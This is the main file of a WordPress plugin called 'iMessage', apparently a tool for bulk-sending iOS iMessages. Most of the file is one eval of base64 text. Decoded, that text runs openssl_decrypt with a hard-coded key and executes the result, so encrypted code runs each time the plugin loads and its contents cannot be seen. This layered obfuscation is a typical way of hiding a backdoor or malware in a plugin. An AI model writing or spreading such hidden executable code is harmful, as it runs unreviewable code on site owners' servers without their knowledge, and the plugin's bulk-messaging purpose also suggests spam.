<?php
/**
 * 插件引导文件
 *
 * 该文件由WordPress读取，以在插件管理区域生成插件信息。
 * 该文件还包括插件使用的所有依赖项,
 * 注册激活和停用功能, 并定义启动插件的函数.
 *
 * @link              https://www.wordpress.org
 * @since             1.0.0
 * @package           CRUD
 *
 * @wordpress-plugin
 * Plugin Name:       iMessage
 * Plugin URI:        https://www.wordpress.org
 * Description:       Ios iMessage 群发插件
 * Version:           2.0.0
 * Author:            iMessage
 * Author URI:        /
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       plugin-name
 * Domain Path:       /languages
 */

global $table_prefix;

defined('YII_DEBUG') or define('YII_DEBUG', WP_DEBUG);
defined('YII_ENV') or define('YII_ENV', YII_DEBUG ? 'dev' : 'prod');
defined('DB_TABLE_PREFIX') or define('DB_TABLE_PREFIX', $table_prefix);

require_once __DIR__ . "/debug.php";
require_once __DIR__ . "/function.php";
require_once __DIR__ . '/vendor/autoload.php';
if (!class_exists('Yii')) {
    require_once __DIR__ . '/vendor/yiisoft/yii2/Yii.php';
}

register_activation_hook(__FILE__, "imessage_activation");
register_deactivation_hook(__FILE__, 'imessage_deactivation');


eval(base64_decode(
    'JHN0ciA9J1owbGFSakp5Vm5CUVRuRm5jM0psVTBjMGVDdERla0ZHUWpKWk5GQkRT'.
    'VGRPWkdwYVVEQkhObmdyZG01UGQyNWwKYkZoTU5HdHhTMVE1VGl0QlJraFRXSGt6'.
    'T1ZKcmIyWTFlakJCTUZsT1QwZHJMekJ2Y0VaSll6QjJLME5HY2tZMgphM1pzU3pC'.
    'UFF6RTFVREZTT1VOM1ZuZDZMMng1ZGtjNGFGRkdSRGQxTDFodWJtbGtWamROTW05'.
    'dVMwVkpRMVE1CmFEbFNkekpuVlhoeWVYcFpWM1F3ZDBOMk5URkxjbFZIVm5jeFpF'.
    'RkJXRWxJWkVOSGFVeFFhVkpsVEhsUk1rMXIKZFhodmRFaGlOMVZPZEZWSVVuaENa'.
    'RlZNVW5OM1RHWm9aMngyTmpsQ05HbFRWV00wZFdrMFNsVnNWbGRHUlVkcgpkbGh5'.
    'WTB0MVFVNXFMemxEY1ZaUGQwOU9SVm96VmxBMWRFZFRla0p4TURGTlRFSldPSFIz'.
    'V0ZJeVRHMUpTRTl2ClIydFlVazV0VUdJdlJFaGthWFpoWTBrck0xSjFSVzkyVmt0'.
    'UldXcEphVTgyZWtSRk1taEJZbWRRVWtFeVQyWkwKU21wVlQwUklaakpGYW5vNGEw'.
    'STBiMkk1ZW5sWVRTOW9aemRITURWQ2FFdGxNbUYzVlUxamNXSlFMMFphU1ZaTQpL'.
    'MXBUUTFGV2JHbHlRblZoV0Zjd1UwWklkbVJYV0hOelVYaG9iVVJyY1hwMlQxRkZk'.
    'VVJwVkhsc1JIUnZOVE5SClZWQmhObFJGVTJwVWJraHllRWxQVlRaVEwybHlVV1JD'.
    'TTNSc2VHYzVWbkJ6T1dSUVdrcDBNbFJXVFdjNFN5OXgKT1c4d2NHOHZWMXBJVGs5'.
    'UmQwWnpaV2RsTVdaNmFFVTVUSFJNWTFkUFZ6UkdNRUZKYkV4UU5tMTNUV1V6YlV4'.
    'VApWalJGTTJkMksybHJiMnA2SzBrd2FubE9SV3MzVkUwdlMycHBUV0pwTVVSaFp5'.
    'OWpUMmt6ZW0xM1N6bE1hVzVEClJXUkNkREY0ZUdWR2VtODNUMGczYWtkVlZ6Vkhj'.
    'Rzl1ZDBsbVJrZHJjM1ZXVkdKSWRYUkNNMjVJZEVONlFVSnIKTVdKdGMzWlVla3hu'.
    'V1VKWlF5OU5hR3hYVEV0aFNrMU1hbmRYZERKblFWbDRRVFJWY0dwd2JWSjNPV1JC'.
    'VUVOaAplbmxqU1ZwU1EyeDVlbWt5ZW1Kc05HWnVkR2xNT1RRclZFcDJNWEJMTDB3'.
    'NWFXUlNSak5IYVVJeVoxRTBUMjlMClNHRlJPWFpXWW05VlZUbHdUbWd3U0ZSMlZF'.
    'dEVPRFV3WjNwMVltVXpiVmxLT1RWdGRXWlBaVXRVZVRkQlMyaHIKWTNoTVpVWmFa'.
    'MVU0VGt0c2NIWnVRMGxqTUZKYWVFTm5PVE5qTlU1TVYyZHlUM1prUVc1alVFMW1X'.
    'a0pNTDB4bgpSbWgwYTJOc1RXVm5OVFF3TkRWS2QzQm5VVEJyUldJMlRWVnRUek42'.
    'ZUdsSU9GQklkRVZ5ZVVsNWNtaENabVprCllrb3lPVWQyTDNjMGFERmFjSGhITW5o'.
    'R2NWaGhaMDFxZFM5SVRsVndSMGhzZHk5R1JETlBTa0l2UlZOVlQxSnkKZWs0eFQw'.
    'NVZNMkk0U1U1RlpFSTRZMjFhVGxZM1FYZG5LMlptVldKUGJHRkZhbFZ1VmxGelRG'.
    'WXhhbkExVW04egpRazAxWldKck1tcFdaRVZVTm1oVVRGaHJkVWhtVDJsUlIwOTVL'.
    'M0JoWlhFMWNXRk9NakZNTlhsV01VeFVielF4CksxcElTREJTV1VSSmJqaGlibVpF'.
    'VUZwSWVtSkNjVmxpTUdOV1pVRjJjVWwwWlZSV05reEpWRXN5WW1kSk9FMWoKTlhk'.
    'aWFHWkViRVJNTlhJNE9FSXdkMDFITjBGSVJFRkNNSE0yTm5oaGNVaFJTVFJtT1do'.
    'U1NEVnhNVzl2WVdKWApaMFpCTkN0SVIxRlZLMlpQVFVGR1dVTTBSME5WU2k4dmFr'.
    'c3lUMHREVmtSVU9GTTVlSGhRYTJOU1R6QlJaMnA1CmIzSnhVVFJTWmt0MVNFNXNR'.
    'M2MwZG1reGQySndkRVJpYVhkQ2NHZG1VV3hTVTNKUlZrcG1jV0ZGWW0xWE5uaHAK'.
    'Y2poeVNuQk5UR2g1T0dZMU1GVldWRFJpVFRWdFEyMVpUWGhLYld3MmVXdHlhR2w0'.
    'TVZkVFdGRlFVVlZLWjNkWQpOREUwVjNOdGRXZzJWWGN3TURScWQwTkRXVGh2VkM5'.
    'MVNUQkxNVU5RTTFKaGJXOWpPVEZhV0VsNVEwOVBPREpxClFteGpjVU5FTkhGclVu'.
    'UjFNems0VmpWWGJIWlRRMHRsZDNaSlJuVXdaR2MwZERoVlozZGtPVUp2Y1M5VGVH'.
    'TkoKZEZFemFXaFdObGR5TmxOM2RYZGFRa0ZPYzJ4NVkzaFNhSFZzTURKcVduTkNP'.
    'R1JhUTI4MWNsVnVVMVUyYkdwVwpOMVpDU3pFMmFISmpZa3hFU1hoRksyTnJia3RC'.
    'WTFWUWFYTkNSMDE2ZURKUlNrMVJaVVJzUW5rdmNUQllZVE42ClJqbDRVVkpLTVV0'.
    'aWFFaFlNM0J5ZWtoUWFWUnFXazlUWmxWUFkxVXJNRzVwWW5GR1pFdDFhVmcwZFhC'.
    'NE4xQkMKZW5ab1dteFJkVE53VEZSbGVUZENTM014TXpOVE1GUkJjMWh3VFZoTllu'.
    'WXlkazFrUTIxU2MxRldiMWw2UkVwUApUbFpvVG5OelkwZEZaRWt4Wmt4MFFUSmhi'.
    'UzlNTWpkNVUzSmtXbVkyZWxaaWFHc3lXVk5XU0ZWVWQwWlVSMjV1ClEyMUNObU5Q'.
    'WXpRdlZYWjFiV3RCYzBRd0sxUXZUM056ZG14WlVqTlZPSGhoUWtKS1RpOXdjMWsw'.
    'Y2pkT09HaEUKTDA5U05tcEJUa1ZsTUhZeWRUSlJSekpJUkM4d1luRlNZM2swTldw'.
    'cVNIZFJhbHBYZVdWWGJuQjBSelpyWVROTgpkRlZVT1hSVVYycDZNbE5RV1d0T04x'.
    'cFBObkZ6UW5FeU9HTlVZemwyWWk5WFRXNDBWV1Z4YjNGUVZEVm5TREJ1CmNURjBh'.
    'MHdyUTFSaGRHODVhamwxVjBOdlFVVlNWM2hVVEU5dGVVbFFlbkJ4V0M5SFRFTnBl'.
    'bkZKZFdWWVZEVksKVUZkMFdtTjZRekYwYTNOWUwwbFVlRlZHWVV0R1ZqRkdiRFpL'.
    'TjBGaVZYRTBWMVpTUWpaUFlqSk9NbFZaWlhGWgpXRkEzY1hkWlJGTjVaVVUxYWxk'.
    'eVRpOTJLM0Y0Vm5GT01IWndSRlJsWVVSUmNUVlVRM05TWVZZNVJFVkpkVVptClNW'.
    'UlBiVzloYjJaMVRIaGxUekFyTW5wRWRGSjJVWEk1YTBoU1lWSlljblF5VEM4NE9V'.
    'OTJOV3B0Ykc4Mk1rMDQKYTB4bVEzSlhRakZaYmxGblQzZ3ZTVzFFZERkRWFqbEVS'.
    'bWxKWkcxeU4weHlUa2Q1YW5kTVFUVnhNazVCYkhwNApVRTgxYVRsaWFUUnJWbTlS'.
    'T0UxRGR6aG1kVkY2UmpaSWRFUndhM0ppUlN0R1pISkNWemt6TUVsb05sRlFhM0Fy'.
    'ClkwMTNMMk5QUWxZdlJUTnVTWFZMTTJKalRGaGpZM0pvZFM5dlpDOU1SbVJrVFVs'.
    'Q1NtY3ZSRzFHWVhkeWRFaEoKTkU5TlVHRlRSRXRJYURFeU5HZHJhamRaUTNGSldV'.
    'RlBTakYyZUVWdVZrRklUMnBXYnpCaEswVXZLelpCTjFSRApNVE5MWlhORk0wbFNa'.
    'a3A0T0ZCbFRIaDRaVXR1YjNaRGNEYzVXWGh1UlZwamRuTjNSR0ZsVDNKak5FbExj'.
    'SEJMCmNsZElUM05LVldrdk5VUnhkbGh5YmtoRVNWQkhhRkpzUlVWd2FFbHZRbE5C'.
    'U0V0bU1sbFpNeTlpVFVGS1ZIUXgKWW5odVEwVXdXSFYyV2s5Q09VZzNUbk5NY2ps'.
    'TmRUQXlaa3BNTDFCU1VVUjRNWFp0VDBkQlpuZGlkakJ3VWpWRgpibmxDVTFjd1R5'.
    'OHliMk5tVUZSVE9VVTBiVWh0YVRoWGFIVkxVMDgwUWtwdlZuRnpjelpWV2k5YU9E'.
    'STRhekYzClJXUXZWVXRIWlhCdmNHNUlURFZSYmpWR2VtNTJLMkkxYUdadlF6UlNS'.
    'MjkzTDI5YWFsQjZNbUZFYjBzNVFteHoKYzJ4QlJXYzRhVkprV2xsS2FWb3JSelEx'.
    'THl0aWFsZ3liSGgxVW5sbmRGcE9NbmRST0cxc1EyUktVMnhZY1RFMApkWE5ZVm5Z'.
    'M2VtZHFabkoyYzAxUU5EZHNTRkIxV1ZGdlducEdVR3cxY0ZoMFFVVndURFpRVmxK'.
    'NFJURjNNRXR6ClRUbFVZblJVYXpabmEzQktNbXRRT0dwcFkydGxZVU0xYlZGSmIw'.
    'aEZiRWRvYW1WU1ExTlRNVXAzYXpaVWFtUlgKVkZCMFNuUkRjbmw2YmpGRFpIQlVV'.
    'WEkzUlZjMlpXbzFhMkZMTkdKYVNUVjNRVEF2Y0hvMFFuRnRiVEYxZFZoSQpUa0ZJ'.
    'TkdKU1ZuazNaMUZwZEVNelluTk9SMEZwY21ORVJWcHhhVlJ5VDJZclNEbGFUSEky'.
    'VlRCNlVYaHVUR3hsCllrRjNjRTB3YmpSb01scG9UalIyZFdzNVFTdEZTVmQzUTB4'.
    'bk1sbEpPWFF3YzNsM2REQXdNM1JYZVZGaU1XRm8KWjJsMGVXa3dLMmd4U0hwMFV6'.
    'YzBNRXh6Ym1sRk4ydHBZbWx3WldZemR6QkxRMlJ6V1ZSeFpqSkhWWE4zZVhFMwpa'.
    'VFpzUjNwb1YwWllURmxtU0V4RGJTdHllaXRoTldoMFVVaFVabE01VTBSMlFVUlhi'.
    'bnBGWlRkQ1lWQnRiMjB2CldHWXpSWHBYU2t4UldWaHFWM0ZUTWxrM1JERktiVVIy'.
    'Ym5aUldVYzVTMWQzVlRoU1pWQTNWMGgyVW5ocWVrUmsKVUhnd0t6bEdSakIyY0hw'.
    'ME9GWXhTRUZJWXl0elRtbG9lVXBCUlVjeVVIQk5SRGw0TURSQ1FVZHpWR2RtUldG'.
    'UQpZMWQzY1RaWEswNURVWFYxZGxSU1YwWjNiMnRXZURGaE5EUlVlV1prYWxZeVds'.
    'UkZNa1JRVGxZck0xSXdVMWxIClYwdGxaVTVVVURkeFp5OUxTV1JsUjA5aFRESTRa'.
    'SGx3U1VoUU5GSlhZa1F4T1dwUWNFeFdNSGRNWVdobU55dHIKU0NzNFQwcEJUVlF4'.
    'WVVKVU0zVTVNVkZoWkhGamFWazRhQ3RhY1dwa1VFeE5UR1pFY0U1d09XODJVelpD'.
    'TUhkTwpTVGhRWmxWUE1GWkNaR2ROV1V0TlNqVkRRVWREVTBKeVpXTkVjWGw0UmpZ'.
    'd2EzcFFkRFpJWm05bVVVeG9RMmhrCk9IQXhOa2t6Um1oR1dFZHZhRkUxY1VSM1ow'.
    'ZFZORVp3SzA4eGExaDJiWGgxWjJsa1lWSldZVnA0VkhkTWVIbHkKYWxOV1Z6QjRZ'.
    'bG92U0RKYWRuTnpZWE12T1ZkaE5uRk5SRFZ6YVhFd1kwSlJUVnBpTW1KSFdVWTVM'.
    'elppWkRkeApUSGRqT1ZWVGVVOXhWbGhIVmxSMVUxRTVTRWRuYzBGQlZsbFRka2RH'.
    'UTFVMWJVSk9ZbEY2WWt4cFFYRm9jMnd6Ck5HcG1Wa042V0ROVk5HcHpkV1ZaWTBR'.
    'NVUySjFaMjlrUTI1SWVYUlRabGRDWVZONVN6bHlVMnhaTjJvd1NtazMKVjBzdk1H'.
    'eE1hVTFzSzA5bGRUbFNiVUpXYUhWUFpHMUlUSFI2UlRSWVZ6bE9WelpwZFVWTU0w'.
    'eDJlVlI1T1VoegpLMkZGTjFOcWNreGxaRWRZVVV4c1RHSnFjSGs1Y1dzMlZta3lO'.
    'bTE1ZDFCVFozaHBhVFY2T0ZoalpUZzRTbGx3ClRFdzBlWEZHWjBnNU1VbGlkRmhC'.
    'WXpoaU0yc3ZZVUZ0Wm1kT1JrTXhibUY0Ym5vdmNHMXNSRFpWVFV4MFIxbEIKTXl0'.
    'VE1ITTBlVkExYjNGWGJpOUphVnByYzJwblFVbENiM0V6WldSc2Jrd3dhRkJXUXpo'.
    'Wk4wOXBhR2h0ZFVsRgpZVzlMWlhGSVNGWnRlR3RvYkVjM09WaFhPSHA0VXlzMVFr'.
    'WXZabkZFT0hvNVVURm1SVE5UU1ZKd1kwVklPRk14ClpIZG1kSE14VlROMVdsaHFM'.
    'MlJuTDNZeWJWaEpiMG8yYkVsa1JrWmxiaTlPTWtaVFIyRkdOVmhHZFhWcmVXeHgK'.
    'UlhSVVUyWmFNV3BKZEhwNmFXdHJkZz09JzsKZXZhbChvcGVuc3NsX2RlY3J5cHQo'.
    'YmFzZTY0X2RlY29kZShzdHJfcmVwbGFjZShQSFBfRU9MLCcnLCRzdHIpICksICdh'.
    'ZXMtMjU2LWNiYycsICc0NzJhNGU1Zi00OWM5LTExZWUtOTQ2OS1kNmU1MzBlZmRh'.
    'NjInLCAwLCAnNDliZTExZWU5NDY5ZDZlNScpKTs='
));